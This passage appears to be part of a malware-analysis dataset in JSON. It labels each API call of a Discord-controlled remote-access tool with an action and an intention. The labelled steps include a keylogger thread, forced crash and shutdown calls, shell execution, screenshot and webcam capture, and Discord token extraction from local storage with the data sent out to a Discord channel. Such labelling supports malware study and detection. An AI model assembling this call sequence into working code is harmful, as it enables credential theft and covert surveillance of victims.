            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=mess",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Prepare thread pool for concurrent execution",
              "intention_id": "concurrent_execution_preparation"
            },
            {
              "action_api": "messa.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "win32gui.EnumWindows()",
              "action_description": "Enumerates all top-level windows",
              "action_id": "enumerate_windows",
              "object": "get_all_hwnd, 0",
              "object_description": "System console window",
              "object_id": "system_console_window",
              "intention_description": "Access system console window handle",
              "intention_id": "access_console_window_handle"
            },
            {
              "action_api": "ctypes.windll.ntdll.RtlAdjustPrivilege()",
              "action_description": "Adjusts process privilege for system operation",
              "action_id": "adjust_process_privilege",
              "object": "19, 1, 0, ctypes.byref(ctypes.c_bool())",
              "object_description": "Process ID",
              "object_id": "process_id",
              "intention_description": "Determine presence of administrator privileges",
              "intention_id": "determine_admin_privileges_presence"
            },
            {
              "action_api": "ctypes.windll.ntdll.NtRaiseHardError()",
              "action_description": "Performs device-specific input/output control",
              "action_id": "perform_device_io",
              "object": "0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong())",
              "object_description": "Process ID",
              "object_id": "process_id",
              "intention_description": "Execute shutdown or restart",
              "intention_id": "execute_shutdown_restart"
            },
            {
              "action_api": "subprocess.check_call()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "command, shell=True",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "getpass.getuser()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "discord.Embed()",
              "action_description": "Creates Discord embed object",
              "action_id": "create_discord_embed",
              "object": "title, color, description",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "embed.set_thumbnail()",
              "action_description": "Sets thumbnail image for Discord embed",
              "action_id": "set_discord_thumbnail",
              "object": "url",
              "object_description": "Discord CDN URL",
              "object_id": "discord_cdn_url",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "ctx.send()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "embed=embed",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Send command output to server",
              "intention_id": "send_command_output_server"
            },
            {
              "action_api": "ImageGrab.grab()",
              "action_description": "Captures screenshot of screen",
              "action_id": "capture_screen_region",
              "object": "bbox=(0,0,640,480)",
              "object_description": "Screen region",
              "object_id": "screen_region",
              "intention_description": "Capture screenshot",
              "intention_id": "capture_screenshot"
            },
            {
              "action_api": "image.save()",
              "action_description": "Saves image to file",
              "action_id": "save_image_file",
              "object": "'camera.png', 'PNG'",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Save screenshot to file",
              "intention_id": "save_screenshot_file"
            },
            {
              "action_api": "discord.File()",
              "action_description": "Create Discord file object",
              "action_id": "create_discord_file",
              "object": "'camera.png'",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "ctx.send()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "file=discord.File('camera.png')",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Send screenshot to server",
              "intention_id": "send_screenshot_server"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "\"shutdown /s /t 1\"",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute shutdown or restart",
              "intention_id": "execute_shutdown_restart"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "\"https://discord.com/api/v9/users/@me\", headers=headers",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "access_attribute_value"
            },
            {
              "action_api": "r.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.getenv(\"APPDATA\"), \".discord\", \"Local Storage\", \"leveldb\"",
              "object_description": "Discord local storage path",
              "object_id": "discord_local_storage",
              "intention_description": "Prepare path for browser data access",
              "intention_id": "prepare_path_browser_data"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Determine presence of local file",
              "intention_id": "determine_local_file_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "os.path.join(path, file), errors=\"ignore\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "embed.add_field()",
              "action_description": "Adds field to Discord embed",
              "action_id": "add_discord_embed_field",
              "object": "name=account_name, value=f\"```{token}```\", inline=False",
              "object_description": "Account name and token",
              "object_id": "account_credentials",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "ctx.send()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "embed=embed",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            },
            {
              "action_api": "wincl.Dispatch()",
              "action_description": "Instantiates WMI interface for system management",
              "action_id": "instantiate_wmi",
              "object": "\"SAPI.SpVoice\"",
              "object_description": "Service name",
              "object_id": "service_name",
              "intention_description": "Initialize shell object",
              "intention_id": "initialize_shell_object"
            },
            {
              "action_api": "speak.Speak()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "ctx.message.content[7:]",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "cv2.VideoCapture()",
              "action_description": "Creates video capture object",
              "action_id": "create_video_capture",
              "object": "0",
              "object_description": "Camera device index",
              "object_id": "camera_device_index",
              "intention_description": "Access system camera",
              "intention_id": "access_system_camera"
            },
            {
              "action_api": "cap.read()",
              "action_description": "Reads frame from video capture device",
              "action_id": "read_video_frame",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access camera frame",
              "intention_id": "access_camera_frame"
            },
            {
              "action_api": "cv2.imwrite()",
              "action_description": "Saves image to file",
              "action_id": "save_image_file",
              "object": "temp + r\"\\temp.png\", frame",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Save screenshot to file",
              "intention_id": "save_screenshot_file"
            },
            {
              "action_api": "cap.release()",
              "action_description": "Releases video capture device",
              "action_id": "release_video_device",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release system resource",
              "intention_id": "release_system_resource"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "temp + r\"\\temp.png\", \"rb\"",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "Image.open()",
              "action_description": "Opens image from in-memory bytes buffer",
              "action_id": "open_image_buffer",
              "object": "io.BytesIO(image_file.read())",
              "object_description": "Image binary stream",
              "object_id": "image_binary_stream",
              "intention_description": "Open screenshot file",
              "intention_id": "open_screenshot_file"
            },
            {
              "action_api": "img.save()",
              "action_description": "Saves image to in-memory buffer",
              "action_id": "save_image_buffer",
              "object": "img_byte_arr, format='PNG'",
              "object_description": "Image binary stream",
              "object_id": "image_binary_stream",
              "intention_description": "Save screenshot to file",
              "intention_id": "save_screenshot_file"
            },
            {
              "action_api": "discord.File()",
              "action_description": "Create Discord file object",
              "action_id": "create_discord_file",
              "object": "io.BytesIO(img_byte_arr), filename=\"temp.png\"",
              "object_description": "Image binary stream",
              "object_id": "image_binary_stream",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "ctx.send()",
              "action_description": "Sends file and message to Discord channel",
              "action_id": "send_discord_file_message",
              "object": "file=file",
              "object_description": "Image binary stream",
              "object_id": "image_binary_stream",
              "intention_description": "Send screenshot to server",
              "intention_id": "send_screenshot_server"
            }
          ]
        }
      ]
    }
  ]
}